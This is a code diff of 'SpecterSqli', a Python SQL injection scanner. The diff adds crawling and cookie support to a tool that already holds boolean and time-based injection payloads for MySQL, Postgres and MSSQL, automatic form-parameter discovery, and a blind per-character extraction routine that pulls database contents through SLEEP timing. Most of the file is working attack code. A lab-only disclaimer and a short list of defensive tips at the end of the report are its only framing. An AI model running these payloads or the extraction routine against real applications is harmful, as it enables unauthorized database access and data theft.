@@ -1,19 +1,30 @@
 #!/usr/bin/env python3
 """
-SpecterSqli - concurrent SQLi scanner with parameter discovery, blind boolean extraction,
-HTML timing charts, JSON & cookie support, and comparison mode.
+SpecterSqli - concurrent SQLi scanner with discovery, timing, blind extraction,
+HTML timing charts, JSON & cookie support, crawling (auto endpoint discovery), and comparison.
+
+IMPORTANT: Use only on systems you own or have explicit permission to test.
+
+Dependencies:
+    pip3 install requests beautifulsoup4 matplotlib
 
 Usage examples:
     python3 specter_sqli.py --target http://10.0.2.15:5000/login.php
-    python3 specter_sqli.py --targets-file endpoints.txt --concurrency 10 --workers 8
-    python3 specter_sqli.py --target http://10.0.2.15:5000/login.php --compare http://10.0.2.20:5000/login.php
-    python3 specter_sqli.py --target http://10.0.2.15:5000/login.php --json
-    python3 specter_sqli.py --target http://10.0.2.15:5000/login.php --blind-extract "information_schema.tables" --maxlen 20
+    python3 specter_sqli.py --targets-file endpoints.txt --concurrency --workers 8
+    python3 specter_sqli.py --target http://10.0.2.15 --crawl --crawl-depth 2
+    python3 specter_sqli.py --target http://10.0.2.15:5000/login.php --blind-extract "SELECT database()" --maxlen 20
+    python3 specter_sqli.py --target http://10.0.2.15:5000/dashboard.php --cookies cookies.json
 
-Note:
- - This tool is for authorized lab/testing only.
- - Dependencies: requests, beautifulsoup4, matplotlib
-   Install: pip3 install requests beautifulsoup4 matplotlib
+Sample endpoints.txt (one per line):
+    http://10.0.2.15:5000/
+    http://10.0.2.15:5000/login.php
+    http://10.0.2.15:5000/search.php
+
+Sample cookies.json:
+    {
+      "PHPSESSID": "9f2c91f72a8a4a3193f22fd8c9aa1234",
+      "sessionid": "b6d81b360a5672d80c27430f39153e2c"
+    }
 """
 
 import argparse
@@ -35,12 +46,13 @@ import matplotlib.pyplot as plt
 # ---------- CONFIG ----------
 DEFAULT_TIMEOUT = 6
 DEFAULT_SLEEP = 4
-LOGFILE = "specter_results.json"
-HTML_REPORT = "specter_report.html"
+DEFAULT_WORKERS = 6
+LOGFILE_DEFAULT = "specter_results.json"
+HTML_REPORT_DEFAULT = "specter_report.html"
 USER_AGENT = "SpecterSqli/1.0"
 # ---------- END CONFIG ----------
 
-# Payloads
+# Payloads and signatures
 BOOLEAN_PAYLOADS = [
     ("Classic OR true", "alice' OR '1'='1' -- -"),
     ("Numeric OR true", "alice' OR 1=1 -- -"),
@@ -48,12 +60,9 @@ BOOLEAN_PAYLOADS = [
 ]
 
 TIME_PAYLOADS = [
-    # MySQL
     ("mysql", "alice' OR IF({COND}, SLEEP({N}), 0) -- -"),
     ("mysql", "alice' OR (SELECT IF({COND}, SLEEP({N}), 0)) -- -"),
-    # Postgres
     ("postgres", "alice' OR (SELECT CASE WHEN {COND} THEN pg_sleep({N}) ELSE pg_sleep(0) END) -- -"),
-    # MSSQL (WAITFOR DELAY) - may need quoting tweaks
     ("mssql", "alice' ; IF ({COND}) WAITFOR DELAY '0:00:{N}' -- -"),
 ]
 
@@ -69,15 +78,16 @@ SQL_ERROR_REGEXES = [
     r"Unhandled Exception",
 ]
 
+# ---------- Helpers ----------
+def timestamp():
+    return time.strftime("%Y-%m-%d %H:%M:%S")
 
-# -------------- Helpers --------------
 def is_probably_json(text):
     try:
         json.loads(text)
         return True
     except Exception:
         return False
-
 
 def contains_sql_error(text):
     if not text:
@@ -87,12 +97,7 @@ def contains_sql_error(text):
             return True
     return False
 
-
-def timestamp():
-    return time.strftime("%Y-%m-%d %H:%M:%S")
-
-
-# -------------- Network utils --------------
+# ---------- Network utils ----------
 def normal_post(session, url, data=None, json_body=None, headers=None, timeout=DEFAULT_TIMEOUT, allow_redirects=True):
     kwargs = {"timeout": timeout, "allow_redirects": allow_redirects}
     if headers:
@@ -101,7 +106,6 @@ def normal_post(session, url, data=None, json_body=None, headers=None, timeout=D
         return session.post(url, json=json_body, **kwargs)
     else:
         return session.post(url, data=data, **kwargs)
-
 
 def baseline_request(session, url, timeout=DEFAULT_TIMEOUT, json_mode=False):
     try:
@@ -123,21 +127,58 @@ def baseline_request(session, url, timeout=DEFAULT_TIMEOUT, json_mode=False):
     except Exception as e:
         return {"ok": False, "error": str(e)}
 
+# ---------- Crawler for auto endpoint discovery ----------
+def crawl_site(session, start_url, max_depth=2, timeout=6):
+    """
+    Simple site crawler (lab-safe):
+     - crawls same-host links only
+     - extracts <a href> and <form action>
+    """
+    visited = set()
+    discovered = set()
+    parsed_start = urlparse(start_url)
+    start_host = parsed_start.netloc
 
-# -------------- Parameter discovery (GET/POST) --------------
+    def crawl(url, depth):
+        if depth > max_depth or url in visited:
+            return
+        visited.add(url)
+        try:
+            r = session.get(url, timeout=timeout)
+        except Exception:
+            return
+        discovered.add(url)
+        soup = BeautifulSoup(r.text or "", "html.parser")
+        # Links
+        for a in soup.find_all("a", href=True):
+            link = urljoin(url, a["href"])
+            pl = urlparse(link)
+            if pl.netloc == start_host:
+                if pl.scheme in ("http", "https"):
+                    crawl(link, depth + 1)
+        # Form actions
+        for form in soup.find_all("form"):
+            action = form.get("action")
+            if action:
+                action_url = urljoin(url, action)
+                pa = urlparse(action_url)
+                if pa.netloc == start_host:
+                    discovered.add(action_url)
+
+    crawl(start_url, 0)
+    return sorted(discovered)
+
+# ---------- Discovery (forms & query params) ----------
 def discover_params(session, url, timeout=DEFAULT_TIMEOUT):
     """
-    - Fetch the page (GET)
-    - Parse forms and inputs
-    - Return list of candidate parameters for GET and POST
+    Fetch page and parse forms for candidate parameter names.
     """
     try:
         r = session.get(url, timeout=timeout)
     except Exception as e:
         return {"error": str(e)}
-
-    forms = []
     soup = BeautifulSoup(r.text or "", "html.parser")
+    forms = []
     for form in soup.find_all("form"):
         form_action = form.get("action") or url
         method = (form.get("method") or "get").lower()
@@ -150,24 +191,17 @@ def discover_params(session, url, timeout=DEFAULT_TIMEOUT):
             value = inp.get("value") or ""
             inputs[name] = {"type": typ, "value": value}
         forms.append({"action": urljoin(url, form_action), "method": method, "inputs": inputs})
-    # fallback: try to parse query string params in the URL
     qparams = {}
     parsed = urlparse(url)
     if parsed.query:
         qparams = parse_qs(parsed.query)
     return {"forms": forms, "query_params": qparams, "page_sample": (r.text or "")[:500]}
 
-
-# -------------- Boolean tests --------------
+# ---------- Boolean tests ----------
 def run_boolean_tests(session, url, param_name_candidates, baseline, json_mode=False, timeout=DEFAULT_TIMEOUT):
-    """
-    For each candidate parameter name, test boolean payloads in POST and GET.
-    Return findings list.
-    """
     findings = []
     for pname in param_name_candidates:
         for desc, payload in BOOLEAN_PAYLOADS:
-            # Build data either as form or JSON depending on json_mode
             if json_mode:
                 data = {pname: payload, "password": "x"}
                 headers = {"Content-Type": "application/json"}
@@ -192,7 +226,6 @@ def run_boolean_tests(session, url, param_name_candidates, baseline, json_mode=F
             likely = False
             if contains_sql_error(body):
                 likely = True
-            # length/time heuristics
             if baseline.get("length") is not None and abs(len(body) - baseline["length"]) > max(20, 0.05 * baseline["length"]):
                 likely = True
             for kw in ("welcome", "dashboard", "logout", "profile", "admin"):
@@ -211,23 +244,17 @@ def run_boolean_tests(session, url, param_name_candidates, baseline, json_mode=F
             })
     return findings
 
-
-# -------------- Time-based / Blind tests --------------
+# ---------- Time-based tests ----------
 def run_time_tests(session, url, param_name_candidates, baseline, sleep_seconds=DEFAULT_SLEEP, json_mode=False, timeout=DEFAULT_TIMEOUT):
-    """
-    For each candidate parameter and each template, run a true/false time-based test.
-    """
     results = []
     for pname in param_name_candidates:
         for db, templ in TIME_PAYLOADS:
             try:
-                # true payload
                 payload_true = templ.format(COND="1=1", N=sleep_seconds)
                 payload_false = templ.format(COND="1=0", N=sleep_seconds)
             except Exception:
                 continue
 
-            # Construct bodies
             if json_mode:
                 body_true = {pname: payload_true, "password": "x"}
                 body_false = {pname: payload_false, "password": "x"}
@@ -237,7 +264,7 @@ def run_time_tests(session, url, param_name_candidates, baseline, sleep_seconds=
                 body_false = {pname: payload_false, "password": "x"}
                 headers = None
 
-            # send false (quick) then true (delayed)
+            # false first
             try:
                 t0 = time.time()
                 if json_mode:
@@ -251,7 +278,6 @@ def run_time_tests(session, url, param_name_candidates, baseline, sleep_seconds=
 
             try:
                 t0 = time.time()
-                # Increase timeout to allow sleep
                 if json_mode:
                     r_true = normal_post(session, url, json_body=body_true, headers=headers, timeout=timeout + sleep_seconds + 2)
                 else:
@@ -274,16 +300,12 @@ def run_time_tests(session, url, param_name_candidates, baseline, sleep_seconds=
             })
     return results
 
-
-# -------------- Blind boolean extraction (per-character) --------------
+# ---------- Blind per-character extraction ----------
 def blind_extract(session, url, param, condition_template, charset=None, maxlen=32, sleep_seconds=1, json_mode=False, timeout=DEFAULT_TIMEOUT):
     """
-    Basic blind boolean extraction for lab use.
-    - condition_template should be something like: "SUBSTRING((SELECT database()),{pos},1)='{ch}'"
-      but we will accept a template using {pos} and {char} placeholders.
-    Example template (MySQL): "ASCII(SUBSTRING((SELECT database()),{pos},1))={ascii}"
-    Or boolean form: "SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),{pos},1)='{char}'"
-    WARNING: This is slow. Use only in lab environments.
+    Very basic blind boolean/time extraction. Slow. Lab-only.
+    condition_template must use placeholders {pos} and either {char} or {ascii}.
+    E.g. "ASCII(SUBSTRING((SELECT database()),{pos},1))={ascii}"
     """
     if charset is None:
         charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@{}-.:/"
@@ -292,48 +314,36 @@ def blind_extract(session, url, param, condition_template, charset=None, maxlen=
     for pos in range(1, maxlen + 1):
         matched_char = None
         for ch in charset:
-            # Build condition replacing placeholders {pos} and {char}
+            # Build condition
             cond = condition_template.format(pos=pos, char=ch, ascii=ord(ch))
-            # Build payload that makes condition true cause a delay OR true response difference
-            # Prefer time-based template: using MySQL IF => SLEEP
             payload = f"alice' OR IF({cond}, SLEEP({sleep_seconds}), 0) -- -"
-            if json_mode:
-                body = {param: payload, "password": "x"}
-                headers = {"Content-Type": "application/json"}
-                t0 = time.time()
-                try:
+            try:
+                if json_mode:
+                    body = {param: payload, "password": "x"}
+                    headers = {"Content-Type": "application/json"}
+                    t0 = time.time()
                     r = normal_post(session, url, json_body=body, headers=headers, timeout=timeout + sleep_seconds + 2)
                     dt = time.time() - t0
-                except Exception as e:
-                    return {"error": f"request error pos={pos} char={ch}: {e}", "found": found}
-            else:
-                body = {param: payload, "password": "x"}
-                t0 = time.time()
-                try:
+                else:
+                    body = {param: payload, "password": "x"}
+                    t0 = time.time()
                     r = normal_post(session, url, data=body, timeout=timeout + sleep_seconds + 2)
                     dt = time.time() - t0
-                except Exception as e:
-                    return {"error": f"request error pos={pos} char={ch}: {e}", "found": found}
+            except Exception as e:
+                return {"error": f"request error pos={pos} char={ch}: {e}", "found": found}
 
-            # If it's delayed (approx) we assume the char matched
             if dt > (sleep_seconds * 0.6):
                 matched_char = ch
                 found += ch
                 print(f"[+] pos {pos} -> '{ch}' (dt={dt:.2f}s)")
                 break
         if not matched_char:
-            # No char matched => stop
             print(f"[-] No match at position {pos}; stopping.")
             break
     return {"extracted": found}
 
-
-# -------------- HTML Report (with charts) --------------
+# ---------- HTML report (timing chart) ----------
 def make_timing_chart_png(timings, title="Response times"):
-    """
-    timings: list of dicts with keys 'label' and 'time'
-    Returns PNG bytes (base64-able)
-    """
     labels = [t["label"] for t in timings]
     times = [t["time"] for t in timings]
     plt.figure(figsize=(max(6, len(labels) * 0.6), 4))
@@ -349,31 +359,25 @@ def make_timing_chart_png(timings, title="Response times"):
     buf.seek(0)
     return buf.read()
 
-
-def build_html_report(results, outfile=HTML_REPORT):
-    """Create a simple HTML file summarizing results and embedding timing charts."""
+def build_html_report(results, outfile=HTML_REPORT_DEFAULT):
     header = f"<h1>SpecterSqli report</h1><p>Generated: {timestamp()}</p>"
     sections = [header]
 
-    # Boolean findings
     if results.get("boolean_findings"):
         sections.append("<h2>Boolean findings</h2><ul>")
         for f in results["boolean_findings"]:
             sections.append("<li><pre>" + json.dumps(f, indent=2) + "</pre></li>")
         sections.append("</ul>")
 
-    # Time tests
     if results.get("time_findings"):
         sections.append("<h2>Time-based findings</h2><ul>")
         for t in results["time_findings"]:
             sections.append("<li><pre>" + json.dumps(t, indent=2) + "</pre></li>")
         sections.append("</ul>")
 
-        # Build a simple chart for true vs false times if available
         timings = []
-        for idx, t in enumerate(results["time_findings"]):
+        for t in results["time_findings"]:
             label = f"{t.get('param')}|{t.get('db')}"
-            # choose the true_time if present else baseline time
             ct = t.get("true_time") or t.get("baseline_time") or 0
             timings.append({"label": label, "time": ct})
         if timings:
@@ -382,11 +386,9 @@ def build_html_report(results, outfile=HTML_REPORT):
             sections.append("<h3>Timing chart (true-time)</h3>")
             sections.append(f'<img src="data:image/png;base64,{b64}" alt="timing chart" />')
 
-    # Blind extraction
     if results.get("blind"):
         sections.append("<h2>Blind extraction</h2><pre>" + json.dumps(results["blind"], indent=2) + "</pre>")
 
-    # Defensive guidance
     sections.append("<h2>Defensive guidance</h2><ul>")
     for s in (
         "Use parameterized queries / prepared statements.",
@@ -403,17 +405,14 @@ def build_html_report(results, outfile=HTML_REPORT):
         f.write(html)
     return outfile
 
-
-# -------------- Orchestration per-target --------------
+# ---------- Orchestration per-target ----------
 def analyze_target(url, opts):
-    """
-    Run discovery, baseline, boolean, time tests on a single target.
-    Returns a dict with all collected data.
-    """
     session = requests.Session()
     session.headers.update({"User-Agent": USER_AGENT})
+    out = {"url": url, "discovery": None, "baseline": None, "boolean_findings": [], "time_findings": [], "blind": None, "crawled_endpoints": None}
+
+    # load cookies if provided
     if opts.cookies:
-        # load cookies from a simple JSON file path provided (if exists)
         if os.path.exists(opts.cookies):
             try:
                 with open(opts.cookies, "r") as f:
@@ -422,33 +421,33 @@ def analyze_target(url, opts):
                 for k, v in ck.items():
                     jar.set(k, v)
                 session.cookies = jar
-                print("[*] Loaded cookies from", opts.cookies)
             except Exception as e:
-                print("[!] Failed to load cookies:", e)
+                out["cookie_error"] = str(e)
 
-    json_mode = opts.json or url.lower().endswith(".json") or False
+    json_mode = bool(opts.json) or url.lower().endswith(".json")
 
-    out = {"url": url, "discovery": None, "baseline": None, "boolean_findings": [], "time_findings": [], "blind": None}
+    # optional crawling (if target is site root and user requested)
+    if opts.crawl and opts.crawl_depth >= 0:
+        try:
+            crawled = crawl_site(session, url, max_depth=opts.crawl_depth, timeout=opts.timeout)
+            out["crawled_endpoints"] = crawled
+        except Exception as e:
+            out["crawled_error"] = str(e)
 
-    # Discover params
+    # Discovery (forms & query params)
     disc = discover_params(session, url, timeout=opts.timeout)
     out["discovery"] = disc
 
-    # Candidate param names
+    # Build candidate parameter list
     candidates = set()
-    # common default candidates
-    for n in ("username", "user", "u", "email", "login", "password", "pass"):
+    for n in ("username", "user", "u", "email", "login", "password", "pass", "q", "search"):
         candidates.add(n)
-    # add discovered form inputs
-    if isinstance(disc, dict) and disc.get("forms"):
-        for f in disc["forms"]:
-            for name in f["inputs"].keys():
+    if isinstance(disc, dict):
+        for f in disc.get("forms", []) or []:
+            for name in f.get("inputs", {}).keys():
                 candidates.add(name)
-    # query params
-    if isinstance(disc, dict) and disc.get("query_params"):
-        for name in disc["query_params"].keys():
-            candidates.add(name)
-
+        for qp in disc.get("query_params", {}).keys():
+            candidates.add(qp)
     candidates = sorted(list(candidates))
     out["candidates"] = candidates
 
@@ -466,29 +465,26 @@ def analyze_target(url, opts):
     time_f = run_time_tests(session, url, candidates, base, sleep_seconds=opts.sleep, json_mode=json_mode, timeout=opts.timeout)
     out["time_findings"] = time_f
 
-    # Blind extraction (optional)
+    # Blind extraction
     if opts.blind_extract:
-        # user supplies a condition template; we support a few helpers e.g. {pos} and {char}
         cond_template = opts.condition_template or opts.blind_extract_condition or "ASCII(SUBSTRING(({expr}),{pos},1))={ascii}"
-        expr = opts.blind_extract  # user-supplied expression like "SELECT database()" or full subquery
-        # Replace placeholder {expr} in template if used
+        expr = opts.blind_extract
         if "{expr}" in cond_template:
             cond_template = cond_template.replace("{expr}", expr)
-        # We will call blind_extract with condition_template that uses {pos} and {char} or {ascii}
-        b = blind_extract(session, url, opts.blind_param or candidates[0], cond_template, charset=opts.charset, maxlen=opts.maxlen, sleep_seconds=opts.sleep, json_mode=json_mode, timeout=opts.timeout)
+        param_for_blind = opts.blind_param or (candidates[0] if candidates else "username")
+        b = blind_extract(session, url, param_for_blind, cond_template, charset=opts.charset, maxlen=opts.maxlen, sleep_seconds=opts.sleep, json_mode=json_mode, timeout=opts.timeout)
         out["blind"] = b
 
     return out
 
-
-# -------------- CLI --------------
+# ---------- CLI ----------
 def parse_args():
     p = argparse.ArgumentParser(prog="SpecterSqli", description="Concurrent SQLi scanner with discovery, timing, blind extraction, JSON & cookie support.")
     p.add_argument("--target", help="Single target URL (e.g. http://10.0.2.15:5000/login.php)", default=None)
     p.add_argument("--targets-file", help="File containing one target URL per line", default=None)
     p.add_argument("--compare", help="Optional second target URL to compare against", default=None)
-    p.add_argument("--concurrency", help="Scan multiple endpoints concurrently from targets-file (toggle)", action="store_true")
-    p.add_argument("--workers", help="Max worker threads (default 6)", type=int, default=6)
+    p.add_argument("--concurrency", help="Scan multiple endpoints concurrently from targets-file", action="store_true")
+    p.add_argument("--workers", help="Max worker threads (default 6)", type=int, default=DEFAULT_WORKERS)
     p.add_argument("--timeout", help="Request timeout seconds", type=int, default=DEFAULT_TIMEOUT)
     p.add_argument("--sleep", help="Seconds for time-based payloads", type=int, default=DEFAULT_SLEEP)
     p.add_argument("--json", help="Treat endpoint as JSON API (send JSON bodies)", action="store_true")
@@ -498,11 +494,12 @@ def parse_args():
     p.add_argument("--condition-template", help="Condition template using {pos} {char} {ascii} or {expr}", default=None)
     p.add_argument("--charset", help="Charset for blind extraction", default=None)
     p.add_argument("--maxlen", help="Max length to extract in blind extraction", type=int, default=32)
-    p.add_argument("--output", help="JSON output filename", default=LOGFILE)
-    p.add_argument("--report", help="HTML report filename", default=HTML_REPORT)
+    p.add_argument("--output", help="JSON output filename", default=LOGFILE_DEFAULT)
+    p.add_argument("--report", help="HTML report filename", default=HTML_REPORT_DEFAULT)
     p.add_argument("--quiet", help="Less console output", action="store_true")
+    p.add_argument("--crawl", help="Automatically crawl site to discover endpoints", action="store_true")
+    p.add_argument("--crawl-depth", help="Crawler depth (default 2)", type=int, default=2)
     return p.parse_args()
-
 
 def main():
     opts = parse_args()
@@ -524,11 +521,29 @@ def main():
         print("[!] No targets specified. Use --target or --targets-file.")
         sys.exit(1)
 
-    # concurrency: if more than one target and --concurrency, use thread pool
     results = []
     start = time.time()
+
+    # If crawling requested and single target provided, derive endpoints from crawling
+    if opts.crawl and opts.target:
+        if not opts.quiet:
+            print("[*] Crawling target for endpoints (this may take a bit)...")
+        tmp_session = requests.Session()
+        tmp_session.headers.update({"User-Agent": USER_AGENT})
+        try:
+            crawled = crawl_site(tmp_session, opts.target, max_depth=opts.crawl_depth, timeout=opts.timeout)
+            if crawled:
+                targets = crawled  # override targets with discovered endpoints
+                if not opts.quiet:
+                    print(f"[+] Discovered {len(crawled)} endpoints via crawl")
+        except Exception as e:
+            if not opts.quiet:
+                print("[!] Crawl failed:", e)
+
+    # concurrent scanning if requested and multiple targets
     if opts.concurrency and len(targets) > 1:
-        print(f"[*] Running in concurrent mode with {opts.workers} workers on {len(targets)} targets")
+        if not opts.quiet:
+            print(f"[*] Running in concurrent mode with {opts.workers} workers on {len(targets)} targets")
         with concurrent.futures.ThreadPoolExecutor(max_workers=opts.workers) as ex:
             futs = {ex.submit(analyze_target, t, opts): t for t in targets}
             for fut in concurrent.futures.as_completed(futs):
@@ -544,37 +559,44 @@ def main():
         for t in targets:
             if not opts.quiet:
                 print(f"[*] Scanning: {t}")
-            res = analyze_target(t, opts)
+            try:
+                res = analyze_target(t, opts)
+            except Exception as e:
+                res = {"url": t, "error": str(e), "trace": traceback.format_exc()}
             results.append(res)
 
-    # If compare specified, run compare (both sequentially)
+    # Comparison mode (optional)
     compare_results = None
     if opts.compare:
         if not opts.quiet:
-            print("[*] Running comparison with", opts.compare)
-        a = analyze_target(targets[0], opts)
-        b = analyze_target(opts.compare, opts)
-        compare_results = {"A": a, "B": b}
+            print("[*] Running comparison between primary target and compare target")
+        try:
+            a = analyze_target(targets[0], opts)
+            b = analyze_target(opts.compare, opts)
+            compare_results = {"A": a, "B": b}
+        except Exception as e:
+            compare_results = {"error": str(e)}
 
-    # Collate brief summary and save
     out = {"generated": timestamp(), "targets": targets, "results": results, "compare": compare_results}
     with open(opts.output, "w") as f:
         json.dump(out, f, indent=2)
     print(f"[+] Results saved to {opts.output}")
 
-    # Build HTML report using the first target's consolidated findings
+    # Build HTML report from first result (if present)
     primary = results[0] if results else {}
     html_in = {
         "boolean_findings": primary.get("boolean_findings"),
         "time_findings": primary.get("time_findings"),
         "blind": primary.get("blind")
     }
-    rpt = build_html_report(html_in, outfile=opts.report)
-    print(f"[+] HTML report written to {rpt}")
+    try:
+        rpt = build_html_report(html_in, outfile=opts.report)
+        print(f"[+] HTML report written to {rpt}")
+    except Exception as e:
+        print("[!] Failed to build HTML report:", e)
 
     elapsed = time.time() - start
     print(f"[*] Done in {elapsed:.1f}s")
-
 
 if __name__ == "__main__":
     main()
